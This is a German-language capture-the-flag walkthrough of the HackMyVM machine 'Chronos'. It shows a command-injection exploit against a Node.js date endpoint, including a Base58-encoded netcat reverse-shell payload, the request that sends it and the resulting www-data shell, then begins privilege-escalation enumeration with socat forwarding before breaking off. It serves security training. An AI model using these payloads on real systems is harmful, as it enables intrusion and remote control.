@@ -1,0 +1,686 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chronos - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Chronos - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+             <h2 class="difficulty-medium">Medium</h2> <!-- Klasse für Gelb -->
+             <div class="circle">
+                 <div class="segment segment-1"></div>
+                 <div class="segment segment-2"></div>
+                 <div class="segment segment-3"></div>
+                 <div class="inner"></div>
+             </div>
+         </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">CyberChef</div>
+                <div class="tool-item">Burp Suite</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">netstat</div>
+                <div class="tool-item">socat</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">EJS-RCE-attack.py</div>
+                <div class="tool-item">node</div>
+                <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access-poc">Initial Access (POC - Node.js RCE)</a></li>
+                <li><a href="#privilege-escalation-enumeration">Privilege Escalation Enumeration</a></li>
+                <li><a href="#privilege-escalation-poc">Privilege Escalation (POC - sudo node)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.115</span>	08:00:27:f9:47:f4	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein ARP-Scan im lokalen Netzwerk identifiziert die IP-Adresse `192.168.2.115` und die zugehörige MAC-Adresse `08:00:27:f9:47:f4`, die auf eine VirtualBox-VM hinweist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem wurde erfolgreich im Netzwerk lokalisiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen detaillierten Portscan mit Nmap auf die Ziel-IP `192.168.2.115` durch. Tragen Sie die IP optional mit einem Hostnamen (z.B. `chronos.local`, basierend auf späteren Logs) in die `/etc/hosts`-Datei ein.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und die Erkennung von ARP-Scans können die initiale Aufklärung erschweren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.115 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-30 01:37 CEST
+Nmap scan report for chronos (192.168.2.115)
+Host is up (0.00014s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey:
+|   2048 e4f283a438898d86a5e13176eb9d5fea (RSA)
+|   256 415a21c458f22be48a2f3173cefd37ad (ECDSA)
+|_  256 9b3428c2b9334b37d501306f87c46b23 (ED25519)
+<span class="command">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+<span class="command">8000/tcp open  http    Node.js Express framework</span>
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-open-proxy: Proxy might be redirecting requests <span class="comment"><!-- Interessant, aber wahrscheinlich Fehlinterpretation von Nmap --></span>
+|_http-cors: HEAD GET POST PUT DELETE PATCH
+MAC Address: 08:00:27:F9:47:F4 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms chronos (192.168.2.115)
+
+Nmap done: 1 IP address (1 host up) scanned in 18.34 seconds
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan identifiziert drei offene TCP-Ports:
+                *   Port 22: SSH (OpenSSH 7.6p1 auf Ubuntu).
+                *   Port 80: HTTP (Apache 2.4.29 auf Ubuntu).
+                *   Port 8000: HTTP (Node.js Express Framework).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Drei potenzielle Angriffsflächen wurden gefunden. Der Node.js-Dienst auf Port 8000 ist besonders interessant, da benutzerdefinierte Webanwendungen oft Schwachstellen aufweisen. Die SSH- und Apache-Versionen sollten auf bekannte Exploits überprüft werden (OpenSSH 7.6p1 ist relativ alt, aber nicht trivial ausnutzbar ohne weitere Infos).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie beide Webserver (Port 80 und 8000) detailliert mit Tools wie Gobuster, Nikto und manueller Analyse. Prüfen Sie die SSH-Konfiguration (Authentifizierungsmethoden).<br><strong>Empfehlung (Admin):</strong> Halten Sie alle Dienste (SSH, Apache, Node.js-Anwendungen und deren Abhängigkeiten) aktuell. Konfigurieren Sie Firewalls, um nur notwendige Ports freizugeben.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.115 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe,ico -b 404,403</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+[+] Url:                     http://192.168.2.115
+[...]
+===============================================================
+2022/10/30 01:40:01 Starting gobuster
+===============================================================
+/<span class="command">index.html</span>           (Status: 200) [Size: 1887]
+/<span class="command">css</span>                  (Status: 301) [Size: 312] [--> http://192.168.2.115/css/]
+[...]
+===============================================================
+2022/10/30 01:42:15 Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Gobuster-Scan wird auf den Apache-Server (Port 80) durchgeführt, um nach versteckten Dateien und Verzeichnissen zu suchen. Es werden nur die `index.html` und das `/css`-Verzeichnis gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Webserver auf Port 80 scheint sehr begrenzt zu sein und bietet wenig Angriffsfläche.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie die Enumeration auf den Node.js-Dienst auf Port 8000.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie unnötige Dateien vom Webserver.</p>
+
+            <p class="analysis"><strong>Untersuchung des Node.js-Dienstes (Port 8000):</strong></p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies eine URL ist, die mit curl o.ä. aufgerufen wurde -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+<span class="command">http://chronos.local:8000/date?format=whoami</span>
+                     </pre>
+                      <!-- Kein Prompt, da dies die Antwort ist -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px; margin-top: 5px;">
+<span class="password">Permission Denied</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein erster Test des `/date`-Endpunkts auf Port 8000 mit dem Parameter `format=whoami` (Verwendung von `chronos.local`, was einen vorherigen `/etc/hosts`-Eintrag impliziert). Die Anwendung gibt "Permission Denied" zurück.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies deutet darauf hin, dass der `format`-Parameter existiert, aber die direkte Ausführung von Befehlen wie `whoami` entweder verhindert wird oder eine bestimmte Syntax erfordert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die erwartete Syntax für den `format`-Parameter. Probieren Sie Format-String-Payloads oder andere Injektionstechniken.<br><strong>Empfehlung (Admin):</strong> Validieren und sanitisieren Sie alle Benutzereingaben streng, insbesondere wenn sie zur Steuerung von Formatierungen oder Befehlsausführungen verwendet werden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies eine URL ist -->
+                      <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+GET http://chronos.local:8000/date?format=<span class="command">4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span>
+                      </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, Ergebnis der CyberChef-Analyse -->
+                      <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+CyberChef (Base58 Decode): <span class="password">'+Today is %A, %B %d, %Y %H:%M:%S.'</span>
+                      </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein weiterer Request verwendet einen Base58-kodierten Payload im `format`-Parameter. Die Dekodierung mit CyberChef ergibt den String `'+Today is %A, %B %d, %Y %H:%M:%S.'`. Dies sieht wie ein Formatstring für ein Datums-Tool (wie `date` oder eine Bibliothek wie `moment.js`) aus. Das führende `'+'` ist hier der entscheidende Hinweis.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es scheint, dass die Anwendung Base58-kodierte Formatstrings erwartet und das `'+'` am Anfang möglicherweise eine Command Injection in einer Funktion ermöglicht, die Datumsformatstrings verarbeitet (ähnlich wie bei der `date`-Funktion in Linux, wo `date '+%H; id'` funktioniert).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konstruieren Sie Payloads für Command Injection, beginnend mit `'+;`, gefolgt vom gewünschten Befehl (z.B. `id`, Reverse Shell), und kodieren Sie den gesamten String (inkl. `'+;` und Befehl) in Base58. Senden Sie diesen kodierten Payload im `format`-Parameter an den `/date`-Endpunkt.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie den Code, der den `format`-Parameter verarbeitet. Verwenden Sie niemals Benutzereingaben direkt in Funktionen, die Befehle ausführen oder Formatstrings interpretieren können (`exec`, `eval`, `system`, `date`, etc.). Verwenden Sie sichere APIs und validieren Sie die Eingaben streng gegen eine Whitelist erlaubter Zeichen/Formate.</p>
+
+             <p class="analysis"><strong>Analyse von Netzwerk-Requests (Firefox/Burp Suite):</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, Daten aus Entwicklertools/Burp -->
+                     <pre>
+// Firefox Network Request (OPTIONS)
+await fetch("http://chronos.local:8000/date?format=...", {
+    "method": "OPTIONS", ...
+});
+
+// Burp Suite Request (GET)
+GET /date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL HTTP/1.1
+Host: chronos.local:8000
+[...]
+<span class="command">X-Forwarded-For: 127.0.0.1</span>
+<span class="command">X-Originating-IP: 127.0.0.1</span>
+<span class="command">X-Remote-IP: 127.0.0.1</span>
+<span class="command">X-Remote-Addr: 127.0.0.1</span>
+[...]
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Mitschnitte zeigen einen `OPTIONS`-Request (vermutlich ein CORS Preflight Request vom Browser) und einen `GET`-Request. Auffällig im `GET`-Request sind die vielen `X-...`-Header, die alle auf `127.0.0.1` gesetzt sind. Dies könnte darauf hindeuten, dass die Anwendung hinter einem Proxy läuft oder dass bestimmte Funktionen nur für lokale Anfragen gedacht sind, aber diese Header vom Client gesetzt werden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die `X-...`-Header könnten für Header-Spoofing-Angriffe relevant sein, falls die Anwendung diesen Headern vertraut, um die Herkunft der Anfrage zu bestimmen. Sie scheinen hier aber nicht direkt für den Exploit relevant zu sein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Behalten Sie die Header im Hinterkopf, falls andere Angriffe fehlschlagen. Konzentrieren Sie sich auf die Ausnutzung des `format`-Parameters.<br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Proxies so, dass sie vertrauenswürdige Header setzen und vom Client gesetzte `X-...`-Header überschreiben oder ignorieren. Validieren Sie die Herkunft von Anfragen serverseitig, wenn nötig.</p>
+
+        </section>
+
+        <section id="initial-access-poc">
+            <h2>Initial Access (POC - Node.js RCE via Date Format)</h2>
+             <p class="analysis"><strong>Ziel:</strong> Demonstration der Ausnutzung der Schwachstelle im `/date`-Endpunkt auf Port 8000 zur Erlangung einer Reverse Shell als `www-data` durch Einschleusen eines Befehls über den Base58-kodierten `format`-Parameter.</p>
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 *   Netzwerkzugriff auf Port 8000 des Ziels (`192.168.2.115`).
+                 *   Eintrag `192.168.2.115 chronos.local` in `/etc/hosts`.
+                 *   Fähigkeit, Base58 zu kodieren (z.B. mit CyberChef).
+                 *   Ein Angreifer-System (IP `192.168.2.153` laut Payload) mit Netcat-Listener.
+                 *   Tools: `curl` oder Burp Suite, `nc`, CyberChef.
+             </p>
+              <p class="recommendation"><strong>Risiko:</strong> Kritisch. Diese Schwachstelle erlaubt die Ausführung beliebiger Betriebssystembefehle im Kontext des Benutzers, der den Node.js-Dienst ausführt (`www-data`), was zur vollständigen Kompromittierung führen kann.</p>
+
+             <p class="analysis"><strong>Schritt 1: Payload vorbereiten</strong></p>
+             <p class="analysis">Der auszuführende Befehl für eine Reverse Shell (z.B. zu `192.168.2.153:4444`) wird konstruiert und dem verwundbaren Formatstring vorangestellt:</p>
+             <pre style="background-color: #272822; color: #f8f8f2; padding: 10px; border-radius: 5px;">'+; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.2.153 4444 > /tmp/f'</pre>
+             <p class="analysis">Dieser gesamte String wird dann Base58-kodiert. Der resultierende Payload ist:</p>
+             <pre style="background-color: #272822; color: #f8f8f2; padding: 10px; border-radius: 5px; word-break: break-all;"><span class="password">2FKaCgCDhrKDtPk3bLhEKFzdkb681KiAmhhBzVoyVfzgkyBLM3dA97yHrZXeEwYs1K8fb8ssVzmwxHaedKHj2mw2LYQ2kdFujaLSrdwbsFL7ky</span></pre>
+
+            <p class="analysis"><strong>Schritt 2: Listener starten</strong></p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre><span class="password">listening on [any] 4444 ...</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System (IP `192.168.2.153`) wird der Netcat-Listener auf Port 4444 gestartet.</p>
+
+             <p class="analysis"><strong>Schritt 3: Exploit senden (via Burp Suite)</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, Burp Suite Request -->
+                     <pre>
+GET /date?format=<span class="password" style="word-break: break-all;">2FKaCgCDhrKDtPk3bLhEKFzdkb681KiAmhhBzVoyVfzgkyBLM3dA97yHrZXeEwYs1K8fb8ssVzmwxHaedKHj2mw2LYQ2kdFujaLSrdwbsFL7ky</span> HTTP/1.1
+Host: chronos.local:8000
+User-Agent: Chronos
+Accept: /
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Origin: http://192.168.2.115:8000
+Connection: close
+If-None-Match: W/"2c-MfmgHCipHeWUG6vYX17MoG9v+uA"
+Referer: http://192.168.2.115:8000/
+Pragma: no-cache
+Cache-Control: no-cache
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der präparierte GET-Request mit dem Base58-kodierten Reverse-Shell-Payload im `format`-Parameter wird an den `/date`-Endpunkt des Node.js-Servers gesendet.</p>
+
+             <p class="analysis"><strong>Schritt 4: Server-Antwort (Irreführend)</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Prompt, Burp Suite Response -->
+                     <pre>
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin:
+Content-Type: text/html; charset=utf-8
+Content-Length: 20
+ETag: W/"14-jYhsC6bytoPaul8ZVooxYibOPkw"
+Date: Sun, 30 Oct 2022 00:25:18 GMT
+Connection: close
+
+<span class="password">Something went wrong</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Server antwortet mit HTTP 200 OK, aber der Body enthält "Something went wrong". Dies deutet darauf hin, dass die Datumsformatierung selbst aufgrund des eingeschleusten Befehls fehlgeschlagen ist, der Befehl aber dennoch ausgeführt wurde.</p>
+
+             <p class="analysis"><strong>Schritt 5: Shell empfangen</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Fortsetzung der Listener-Ausgabe -->
+                     <pre>
+<span class="password">listening on [any] 4444 ...</span>
+<span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.115] 37816</span>
+/bin/sh: 0: can't access tty; job control turned off
+<span class="prompt" style="color: yellow;">$</span> <span class="command">id</span>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Ergebnis:</strong> Unabhängig von der Fehlermeldung im HTTP-Response empfängt der Netcat-Listener die Verbindung und stellt eine Shell als `www-data` bereit.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der POC war erfolgreich und demonstriert die RCE-Schwachstelle durch Command Injection im `format`-Parameter.</p>
+              <p class="recommendation"><strong>Empfehlung (Admin):</strong> Beheben Sie die Command-Injection-Schwachstelle im `/date`-Endpunkt dringend. Implementieren Sie sichere Programmierpraktiken, Input-Validierung und vermeiden Sie die Ausführung von Betriebssystembefehlen basierend auf Benutzereingaben.</p>
+
+             <p class="analysis"><strong>Shell-Stabilisierung (wie zuvor):</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">$</span> <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                     <pre><span class="prompt" style="color: yellow;">www-data@chronos:/opt/chronos$</span></pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@chronos:/opt/chronos$</span> <span class="command">export TERM=xterm</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@chronos:/opt/chronos$</span> <span class="command">^Z</span></div>
+                     <pre>zsh: suspended  nc -lvnp 4444</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 4444
+                                reset
+<span class="prompt" style="color: yellow;">www-data@chronos:/opt/chronos$</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die erhaltene Shell wird stabilisiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt für eine komfortable weitere Interaktion.</p>
+
+        </section>
+
+        <section id="privilege-escalation-enumeration">
+            <h2>Privilege Escalation Enumeration</h2>
+            <p class="analysis"><strong>Kontext:</strong> Als Benutzer `www-data` wird das System weiter untersucht, um Wege zur Privilegienerweiterung zu finden.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@chronos:/opt/chronos$</span> <span class="command">ls /home</span></div>
+                    <pre><span class="command">imera</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Identifiziert den Benutzer `imera`.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@chronos:/opt/chronos$</span> <span class="command">cat /etc/release</span></div> <span class="comment"><!-- Wahrscheinlich /etc/os-release oder /etc/lsb-release gemeint --></span>
+                     <pre>
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=18.04
+DISTRIB_CODENAME=bionic
+DISTRIB_DESCRIPTION="Ubuntu 18.04.1 LTS"
+[...]
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@chronos:/opt/chronos$</span> <span class="command">uname -r</span></div>
+                     <pre>4.15.0-151-generic</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@chronos:/opt/chronos$</span> <span class="command">uname -a</span></div>
+                     <pre>Linux chronos 4.15.0-151-generic #157-Ubuntu [...]</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Systeminformationen werden gesammelt: Ubuntu 18.04.1 LTS, Kernel 4.15.0-151.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Nützlich für die Suche nach spezifischen Kernel- oder OS-Exploits.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach bekannten Exploits für Ubuntu 18.04 und Kernel 4.15.0.<br><strong>Empfehlung (Admin):</strong> System aktuell halten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@chronos:/opt/chronos$</span> <span class="command">cd /home/imera/</span></div>
+                     <div class="prompt" style="color: yellow;">www-data@chronos:/home/imera$</span> <span class="command">ls -la</span></div>
+                     <pre>
+[...]
+-rw-r--r-- 1 imera imera  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 imera imera 3771 Apr  4  2018 .bashrc
+[...]
+-rw-r--r-- 1 imera imera  807 Apr  4  2018 .profile
+-rw-r--r-- 1 imera imera    0 Jul 29  2021 .sudo_as_admin_successful
+<span class="command">-rw------- 1 imera imera   37 Aug  3  2021 user.txt</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Inhalt des Home-Verzeichnisses von `imera`. Die Datei `user.txt` ist vorhanden, aber nicht lesbar. Die leere Datei `.sudo_as_admin_successful` ist ein Artefakt, das oft nach erfolgreicher `sudo`-Ausführung angelegt wird.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Ort der User-Flag.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@chronos:/home/imera$</span> <span class="command">cat user.txt</span></div>
+                     <pre>cat: user.txt: Permission denied</pre>
+                     <div class="prompt" style="color: yellow;">www-data@chronos:/home/imera$</span> <span class="command">cat .sudo_as_admin_successful</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt" style="color: yellow;">www-data@chronos:/home/imera$</span> <span class="command">sudo -l</span></div>
+                     <pre>[sudo] password for www-data:</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Bestätigt fehlende Leserechte für `user.txt` und fehlende `sudo`-Rechte für `www-data`.</p>
+
+             <p class="analysis"><strong>Entdeckung von Chronos v2:</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@chronos:/home/imera$</span> <span class="command">cd /opt/chronos-v2/backend/</span></div>
+                     <div class="prompt" style="color: yellow;">www-data@chronos:/opt/chronos-v2/backend$</span> <span class="command">ls -la</span></div>
+                     <pre>
+drwxr-xr-x  3 root root  4096 Aug  3  2021 .
+drwxr-xr-x  4 root root  4096 Aug  3  2021 ..
+drwxr-xr-x 71 root root  4096 Aug  3  2021 node_modules
+-rw-r--r--  1 root root   296 Jul 29  2021 package.json
+-rw-r--r--  1 root root 43066 Aug  3  2021 package-lock.json
+<span class="command">-rw-r--r--  1 root root   505 Aug  3  2021 server.js</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Verzeichnis `/opt/chronos-v2` wird entdeckt, das eine weitere Node.js-Anwendung (`server.js`, `package.json`) enthält.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@chronos:/opt/chronos-v2/backend$</span> <span class="command">cat server.js</span></div>
+                     <pre>
+const express = require('express');
+const fileupload = require("express-fileupload"); <span class="comment"><!-- Abhängigkeit --></span>
+const http = require('http')
+
+const app = express();
+
+app.use(fileupload({ parseNested: true })); <span class="comment"><!-- Verwendung mit parseNested --></span>
+
+app.set('view engine', 'ejs'); <span class="comment"><!-- EJS Template Engine --></span>
+app.set('views', "/opt/chronos-v2/frontend/pages");
+
+app.get('/', (req, res) => {
+   res.render('index')
+});
+
+const server = http.Server(app);
+// ...
+const addr = "127.0.0.1" <span class="comment"><!-- Lauscht nur auf localhost --></span>
+const port = 8080;
+// ...
+server.listen(port, addr, () => {
+   console.log('Server listening on ' + addr + ' port ' + port);
+});
+
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Quellcode von `server.js` zeigt eine Express-Anwendung, die:
+                *   `express-fileupload` mit der Option `parseNested: true` verwendet.
+                *   Die Template-Engine EJS benutzt.
+                *   Nur auf `127.0.0.1:8080` (localhost) lauscht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein kritischer Fund! Die Kombination aus `express-fileupload` (insbesondere mit älteren Versionen oder `parseNested: true`) und EJS ist bekannt für eine Prototyp-Pollution-Schwachstelle, die zu Remote Code Execution (RCE) führen kann. Da der Dienst nur lokal lauscht, muss ein Port Forwarding eingerichtet werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `socat` oder ein ähnliches Tool, um Port 8080 von localhost auf einen Port weiterzuleiten, den Sie von Ihrer `www-data`-Shell erreichen können (z.B. 5555). Suchen Sie nach einem Exploit für die EJS/express-fileupload-Schwachstelle und wenden Sie ihn auf den weitergeleiteten Port an.<br><strong>Empfehlung (Admin):</strong> Aktualisieren Sie `express-fileupload` und andere Node.js-Abhängigkeiten. Vermeiden Sie die Option `parseNested: true`, wenn nicht unbedingt nötig. Stellen Sie sicher, dass Template-Engines sicher konfiguriert sind und keine unsicheren Funktionen preisgeben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@chronos:/opt/chronos-v2/backend$</span> <span class="command">netstat -tlnp</span></div>
+                     <pre>
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 <span class="command">127.0.0.1:8080</span>          0.0.0.0:*               LISTEN      - <span class="comment"><!-- Chronos v2 --></span>
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::8000                 :::*                    LISTEN      824/node <span class="comment"><!-- Chronos v1 --></span>
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `netstat` bestätigt, dass Port 8080 nur auf `127.0.0.1` lauscht.</p>
+
+             <p class="analysis"><strong>Port Forwarding einrichten:</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@chronos:/tmp$</span> <span class="command">socat TCP-LISTEN:5555,fork TCP:127.0.0.1:8080</span></div>
+                     <pre>[socat lauscht im Hintergrund/Vordergrund]</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `socat` wird gestartet, um eingehende TCP-Verbindungen auf Port 5555 (auf allen Interfaces des Zielsystems, erreichbar für `www-data`) an `127.0.0.1:8080` weiterzuleiten. `fork` erlaubt die Bearbeitung mehrerer Verbindungen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Macht die anfällige Chronos-v2-Anwendung für den Exploit von außen (über Port 5555) erreichbar.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie den Exploit nun gegen `http://192.168.2.115:5555` aus.<br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Möglichkeit für niedrig privilegierte Benutzer, Port-Forwarding-Tools wie `socat` auszuführen oder Sockets zu öffnen.</p>
+
+             <p class="analysis"><strong>Exploit vorbereiten und ausführen (auf Angreifer-System):</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
